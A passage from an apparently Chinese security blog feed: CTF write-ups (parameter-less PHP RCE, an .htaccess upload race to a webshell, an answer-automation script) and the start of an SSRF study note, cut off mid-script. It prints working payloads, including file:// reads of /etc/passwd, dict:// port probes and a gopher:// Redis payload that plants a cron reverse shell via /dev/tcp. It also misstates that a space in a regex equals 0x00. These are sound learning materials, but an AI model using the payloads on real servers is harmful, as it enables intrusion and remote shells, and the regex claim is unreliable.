alt></p><blockquote><p>非预期解</p></blockquote><p>看了师傅们的wp,发现师傅们真的牛逼.看来我对PHP代码的敏感性还是不够,必须多锻炼我们来看一下代码中的那段正则表达式</p><pre class=" language-PHP"><code class="language-PHP">if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name']))</code></pre><p>这段正则表达式,我之前简单分析的就是匹配<code>data://,filter://,php://和.</code>的,但是因为出题人为了代码的美观性,在管道符<code>|</code>旁边多加了空格,下面就注意了!!!!</p><blockquote><p>在正则匹配里面,空格就是<code>0x00</code>,这就导致前面匹配三个协议都失效了,只匹配了最后一个<code>.</code></p></blockquote><p>tips: </p><p>写正则表达式,不要随便乱打空格.读正则表达式,一定要仔细,不要一眼读个大概就走了</p><p>因此这里只需要<code>echo file_get_contents($uploader);</code> <code>$this-&gt;Filename = $_GET[&#39;name&#39;];</code></p><pre><code>upload.php/?name=flag.php</code></pre><h1 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃***"></a>禁止套娃***</h1><ul><li>Git源码泄露</li><li>无参数RCE/套娃命令执行</li></ul><p>扫描目录发现<code>/.git</code>,因此使用GitHack下载源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// echo $_GET['exp'];</span>                @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// highlight_file(__FILE__);</span><span class="token delimiter">?></span></code></pre><p>有三个if判断,三个正则,要想得到flag,必须一个一个绕过套娃</p><p>第一个<code>data:\/\/|filter:\/\/|php:\/\/|phar:\/\/</code></p><p>匹配<code>data://,filter://,php://,phar://</code>这几个协议,使其不能通过文件文件包含来读取flag.php</p><p>第二个<code>[a-z,_]+\((?R)?\)</code>匹配a到z的字母和<code>_</code>以及这个<code>\((?R)?\)</code>,<code>(?R)</code>表示引用当前表达式的意思,多一个<code>?</code>表示可以有引用,也可以没有,匹配成功后用NULL替换,第二个正则的合法匹配是类似<code>a(b());</code>这种无参数命令套娃</p><p>则进行第三个匹配</p><p><code>/et|na|info|dec|bin|hex|oct|pi|log/i</code>这个匹配应该就是为了过滤一下相关的函数.</p><p>现在就是要如何构造一个无参数的payload并且让<code>eval()</code>这个函数来执行了读取flag.php</p><blockquote><p>无参数RCE的主要思路就是利用PHP动态函数的特性,在PHP5不行,在PHP7可以</p></blockquote><p>因为直接访问<code>flag.php</code>是不为空的(没有404),所以利用函数读取就行,思路难度在如何bypass</p><p>先使用<code>scandir()</code>函数查看当前目录情况,在使用<code>pos(localeconv())</code>构造<code>.</code>,再<code>print_r()</code>打印结果</p><pre><code>/?exp=print_r(scandir(pos(localeconv())));</code></pre><p><img src="https://i.loli.net/2020/01/23/ZmCL4dfVcWUTkEt.png" alt></p><p>得到flag.php在倒数第二个位置,我们知道<code>next()</code>函数可以读取数组中第二个元素,由于flag在倒数第二个,所以使用<code>array_reverse()</code>函数将数组反转,再使用next函数即可读取flag,再使用<code>show_source()</code>函数来显示PHP代码,拿到flag.也可以使用<code>highlight_file()</code>函数</p><p>最终的payload</p><pre><code>/?exp=print_r(highlight_file(next(array_reverse(scandir(pos(localeconv()))))));</code></pre><p>或者</p><pre><code>/?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre><p><img src="https://i.loli.net/2020/01/23/sZm5ebilpwrY8fV.png" alt></p><p>寒假必须看看PHP手册了</p><pre class=" language-PHP"><code class="language-PHP"><?php  $a = scandir('.'); // "." 表示列出当前目录 "/" 列出根目录 "../"列出上一级目录  var_dump($a);?></code></pre><p>参考资料: </p><p><a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/#comment-15" target="_blank" rel="noopener">php无参数命令执行</a></p><h1 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h1><p>随便上传了一个<code>eeee.png</code>上去,发现居然也会检测文件?fuzz了一下,会检测文件后缀名不能含有<code>ph</code></p><p><img src="https://i.loli.net/2020/01/23/zd9iQrgUjNGCEDh.png" alt></p><p>于是肯定就知道了会利用<code>Apache解析文件上传一个.htaccess</code>文件 <code>SetHandler application/x-httpd-php</code></p><p>让服务器把上传的合法其他文件当做php文件来解析,执行其中的php代码,获得shell或者拿flag</p><p>由于之前fuzz测试的时候发现,什么后缀的都好像不能传.这明显不符合道题,因此可能是存在<code>条件竞争</code>,即我们上传的正常文件一下就被删除了,<strong>需要不断的上传文件</strong>,<strong>利用还未被删除的这个间隙去执行</strong></p><p>因为不知道文件上传的路径,只能够猜测了,访问<code>http://8aaad470-51db-4087-a5cf-041bd24d53b0.node3.buuoj.cn/upload/</code>返回的是forbidden,说明确实存在这个路径</p><p>随便传一个图片上去,返回了文件的路径,再随便传一个文件上去,返回了同样的路径,说明,在session不变的情况下,路径是不变的.</p><p>说明就可以利用条件竞争来getshell</p><p><img src="https://i.loli.net/2020/01/23/xDaJtjO9HImMlr5.png" alt></p><p>成功用蚁剑连上后,找到flag即可</p><h1 id="StrongestMind"><a href="#StrongestMind" class="headerlink" title="StrongestMind"></a>StrongestMind</h1><p>打开题目后,发现是一个计算器,要计算一千次才能得到flag.这个和bugku上的题有的像</p><p>写脚本就好了,主要就是<code>re</code>和<code>requests</code>库,还有循环执行1000次</p><p>exp.py</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> requests <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> res <span class="token operator">=</span> session<span class="token punctuation">(</span><span class="token punctuation">)</span>a <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://875cd671-8b00-4030-bda7-5ffc93dd8410.node3.buuoj.cn"</span><span class="token punctuation">)</span>pattern <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'\d+.[+-].\d+'</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>text<span class="token punctuation">)</span>c <span class="token operator">=</span> eval<span class="token punctuation">(</span>pattern<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>a <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://875cd671-8b00-4030-bda7-5ffc93dd8410.node3.buuoj.cn/"</span><span class="token punctuation">,</span> data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"answer"</span> <span class="token punctuation">:</span> c<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pattern <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'\d+.[+-].\d+'</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    c <span class="token operator">=</span> eval<span class="token punctuation">(</span>pattern<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    a <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://875cd671-8b00-4030-bda7-5ffc93dd8410.node3.buuoj.cn/"</span><span class="token punctuation">,</span> data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"answer"</span> <span class="token punctuation">:</span> c<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>路漫漫…</p><p>不敢停…</p><hr><p>今天是除夕,新年快乐!希望新的一年,技术能变强大,希望能快点,因为感觉追不上了,但有怕速度太快,学的不扎实!</p><p>多锻炼身体,规律作息吧!!!!</p><p>希望一切</p><p>都</p><p>顺心顺意</p><p>一切</p><p>都会变好的</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Ping-Ping-Ping&quot;&gt;&lt;a href=&quot;#Ping-Ping-Ping&quot; class=&quot;headerlink&quot; title=&quot;Ping Ping Ping&quot;&gt;&lt;/a&gt;Ping Ping Ping&lt;/h1&gt;&lt;p&gt;命令执行&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;bypa
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://hack-for.fun/categories/Writeup/"/>
    
    
      <category term="命令执行" scheme="https://hack-for.fun/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="弱口令" scheme="https://hack-for.fun/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
    
      <category term="sqli" scheme="https://hack-for.fun/tags/sqli/"/>
    
      <category term="文件包含" scheme="https://hack-for.fun/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
      <category term="phar反序列化" scheme="https://hack-for.fun/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="git源码泄露" scheme="https://hack-for.fun/tags/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    
      <category term="套娃命令执行" scheme="https://hack-for.fun/tags/%E5%A5%97%E5%A8%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>一篇文章深入学习SSRF漏洞</title>
    <link href="https://hack-for.fun/posts/20200120/"/>
    <id>https://hack-for.fun/posts/20200120/</id>
    <published>2020-01-20T02:01:03.119Z</published>
    <updated>2020-01-25T16:18:05.441Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00    前言"></a>0x00    前言</h1><p>因为最近做题遇到了两道在考察SSRF漏洞的CTF题目,感觉只是知道个大概,知道怎么去判断可能存在SSRF漏洞肯定是不够的,必须要从原理上理解这个漏洞,因为<strong>SSRF漏洞更多的不是一个漏洞,而是一种攻击思路.</strong></p><blockquote><p>本学习笔记,大量参考自网络上各位大佬总结好的,再加上自己的心得总结而成,用途仅用于安全技术学习.文末注明参考资料,侵删.</p></blockquote><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01    基础知识"></a>0x01    基础知识</h1><p>这里新的相关基础知识不是很多,主要是以前都有总结过.主要是一些<strong>函数</strong>和一些<strong>协议</strong>的知识</p><h2 id="PHP-function"><a href="#PHP-function" class="headerlink" title="PHP function"></a>PHP function</h2><p>下面学习相关函数和后端实现(从CTF wiki拿过来的)</p><p><code>file_get_contents()</code></p><p><img src="https://i.loli.net/2020/01/20/Al1HjTFmIpxSeWv.png" alt></p><pre class=" language-PHP"><code class="language-PHP"><?phpif (isset($_POST['url'])) {     $content = file_get_contents($_POST['url']);     $filename ='./images/'.rand().';img1.jpg';     file_put_contents($filename, $content);     echo $_POST['url'];     $img = "<img src=\"".$filename."\"/>"; }echo $img;?></code></pre><p><code>fsockopen()</code></p><p><img src="https://i.loli.net/2020/01/20/6KiSlzRa5W43fT7.png" alt></p><pre class=" language-PHP"><code class="language-PHP"><?php function GetFile($host,$port,$link) { // 定义一个请求文件的函数    $fp = fsockopen($host, intval($port), $errno, $errstr, 30); // intval()获取变量的整数值     if (!$fp) {         echo "$errstr (error number $errno) \n";     } else { // 发起HHTP请求        $out = "GET $link HTTP/1.1\r\n";         $out .= "Host: $host\r\n";         $out .= "Connection: Close\r\n\r\n";         $out .= "\r\n";         fwrite($fp, $out);         $contents='';         while (!feof($fp)) {             $contents.= fgets($fp, 1024);         }         fclose($fp);         return $contents;     } }?></code></pre><p><code>curl_exec()</code></p><p><img src="https://i.loli.net/2020/01/20/yg9V2ovedIGnCUa.png" alt></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$curlobj</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//初始化一个cURL会话为curlobj</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置URL选项</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 抓取URL并传递给浏览器</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 关闭cURL资源,释放系统资源</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'./curled/'</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.txt'</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>Python后端实现</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding: utf-8</span>    <span class="token keyword">import</span> urllib    url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1'</span>    info <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h2><p><strong>Dict 协议</strong> <a href="http://www.dict.org/rfc2229.txt" target="_blank" rel="noopener">http://www.dict.org/rfc2229.txt</a></p><p><a href="https://baike.baidu.com/item/DICT协议" target="_blank" rel="noopener">https://baike.baidu.com/item/DICT%E5%8D%8F%E8%AE%AE</a></p><p>Dict协议,字典服务器器协议,dict是基于查询响应的TCP协议,它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。</p><p><strong>Gopher 协议</strong></p><p>Gopher协议是互联网上使用的分布型的文件搜集获取网络协议。gopher协议是在HTTP协议出现之前,在internet上常见重用的协议,但是现在已经用的很少了</p><p><img src="https://i.loli.net/2020/01/20/ayzGWCRSKb7Vhwr.png" alt></p><p><strong>File 协议</strong></p><p>这个协议就比较熟悉了吧</p><p>File协议也就是,本地文件传输协议</p><h1 id="0x02-什么是SSRF漏洞"><a href="#0x02-什么是SSRF漏洞" class="headerlink" title="0x02    什么是SSRF漏洞"></a>0x02    什么是SSRF漏洞</h1><h2 id="SSRF-简介"><a href="#SSRF-简介" class="headerlink" title="SSRF    简介"></a>SSRF    简介</h2><p>SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF <strong>攻击的目标是从外网无法访问的内部系统。</strong></p><p>因此学习SSRF就奔着三个目的.what?how to do?how to bypass?</p><p>漏洞形成的<strong>原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</strong></p><p>攻击者可以利用 SSRF 实现的攻击主要有 5 种：</p><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li><li>攻击运行在内网或本地的应用程序（比如溢出）</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</li><li>利用 <code>file</code> 协议读取本地文件等</li></ol><h2 id="SSRF漏洞-出现的场景"><a href="#SSRF漏洞-出现的场景" class="headerlink" title="SSRF漏洞    出现的场景"></a>SSRF漏洞    出现的场景</h2><ul><li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li><li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li><li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li><li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li><li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li></ul><hr><ol><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用户体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞。<br>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</li><li>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</li></ol><h2 id="SSRF漏洞验证"><a href="#SSRF漏洞验证" class="headerlink" title="SSRF漏洞验证"></a>SSRF漏洞验证</h2><p>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求</p><p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p><p>2.dnslog等工具进行测试，看是否被访问</p><p>–可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</p><p>3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址</p><p>–从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p><p>–通过二级域名暴力猜解工具模糊猜测内网地址</p><p>4.直接返回的Banner、title、content等信息</p><p>5.留意bool型SSRF</p><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03    漏洞利用"></a>0x03    漏洞利用</h1><h2 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h2><p><img src="https://i.loli.net/2020/01/20/NI4mZPVf1ypKxQo.png" alt>可以看到curl可以支持的协议有dice file ftp ftps gopher http https…</p><p>file协议查看文件 <code>curl -v &#39;file://etc/passwd</code></p><p><img src="https://i.loli.net/2020/01/20/4dJ5DYr62HWIGkO.png" alt></p><p>dict协议探测端口<code>curl -v &#39;dict://127.0.0.1:22/info&#39;</code>查看ssh的banner信息,<code>curl -v  &#39;dict://127.0.0.1:6379/info&#39;</code>查看redis相关配置</p><p><img src="https://i.loli.net/2020/01/20/E5N18xmjpXVHeYz.png" alt></p><p>gopher协议支持GET&amp;POST请求,同时在攻击内网ftp/redis/telnet/Memcache上有非常大的作用,<strong>利用gopher协议访问redis反弹shell</strong></p><pre><code>curl -v &#39;gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&#39;</code></pre><h2 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h2><p>首先假设攻击者预先编辑好的SSRF漏洞为ssrf.php</p><p>dict协议探测端口</p><pre><code>curl -v ‘http://a.com/ssrf.php?url=dict://172.0.0.1:22/info‘curl -v ‘http://a.com/ssrf.php?url=dict://127.0.0.1:6379/info‘</code></pre><p>gopher协议访问redis反弹shell</p><pre><code>curl -v &#39;http://a.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&#39;</code></pre><p>漏洞代码ssrf2.php</p><ol><li>限制协议HTTP/HTTPS</li><li>跳转重定向为true,默认不跳转</li></ol><pre class=" language-PHP"><code class="language-PHP"><?phpfunction curl($url){$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);// 限制为HTTPS、HTTP协议curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);curl_setopt($ch, CURLOPT_HEADER, 0);curl_exec($ch);curl_close($ch);}$url = $_GET['url'];curl($url);?></code></pre><p>这种情况使用dict协议是不行的,但是可以利用302跳转的方式来绕过http协议限制</p><pre><code>curl -v &quot;http:///forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://a.com/302.php?helo.jpg[/img]&quot;</code></pre><p>302.php中的代码为: </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span>"Location<span class="token punctuation">:</span> dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//10.0.0.2:6379/info");#探测redsi信息</span><span class="token delimiter">?></span></code></pre><p>location 302 跳转辅助脚本</p><pre class=" language-PHP"><code class="language-PHP"><?php$ip = $_GET['ip'];$port = $_GET['port'];$scheme = $_GET['s'];$data = $_GET['data'];header("Location: $scheme://$ip:$port/$data");?></code></pre><p>举例腾讯微博2016年的SSRF(参考资料3)</p><pre><code>curl -v &#39;http://share.v.t.qq.com/index.php?c=share&amp;a=pageinfo&amp;url=http://localhost/file.php&#39;#file.php&lt;?phpheader(&quot;Location: file:///etc/passwd&quot;);?&gt;</code></pre><h2 id="攻击Application"><a href="#攻击Application" class="headerlink" title="攻击Application"></a>攻击Application</h2><p>正如笔记开篇说道,ssrf更多的来说是一种攻击模式.web ssrf可以作为跳板来攻击内网多种应用.比如redis/discuz/fastcgi/memcache/webdav/Struts/jboss/axis2等应用</p><p>虽然下面很多东西现在我还用不到,但是遇见了就学习记录下来,以后随时可以翻看</p><p>首先需要探测目标内网,因为服务器支持gopher协议,<strong>ssrf+gopher=ssrfsocks</strong></p><p><a href="https://github.com/iamultra/ssrfsocks" target="_blank" rel="noopener">https://github.com/iamultra/ssrfsocks</a></p><p><a href="https://github.com/bcoles/ssrf_proxy" target="_blank" rel="noopener">https://github.com/bcoles/ssrf_proxy</a></p><p>第一个大概是在讲解原理,第二个是一个ssrf代理的工具</p><p>猪猪侠的ssrfsocks.py脚本</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> socket<span class="token keyword">import</span> thread<span class="token keyword">import</span> binascii<span class="token keyword">import</span> struct<span class="token keyword">import</span> urllib<span class="token keyword">import</span> urllib2HOST <span class="token operator">=</span> <span class="token string">'localhost'</span>PORT <span class="token operator">=</span> <span class="token number">65432</span>BUFSIZ <span class="token operator">=</span> <span class="token number">4096</span>TIMEOUT <span class="token operator">=</span> <span class="token number">5</span>SOCKS <span class="token operator">=</span> <span class="token boolean">True</span>CONNECT <span class="token operator">=</span> <span class="token string">"gopher%3A//"</span><span class="token keyword">def</span> <span class="token function">decodesocks</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> req<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'x04'</span><span class="token punctuation">:</span><span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'bad version number'</span><span class="token punctuation">)</span><span class="token keyword">if</span> req<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'x01'</span><span class="token punctuation">:</span><span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'only tcp stream supported'</span><span class="token punctuation">)</span>port <span class="token operator">=</span> req<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>host <span class="token operator">=</span> req<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token keyword">if</span> host<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token 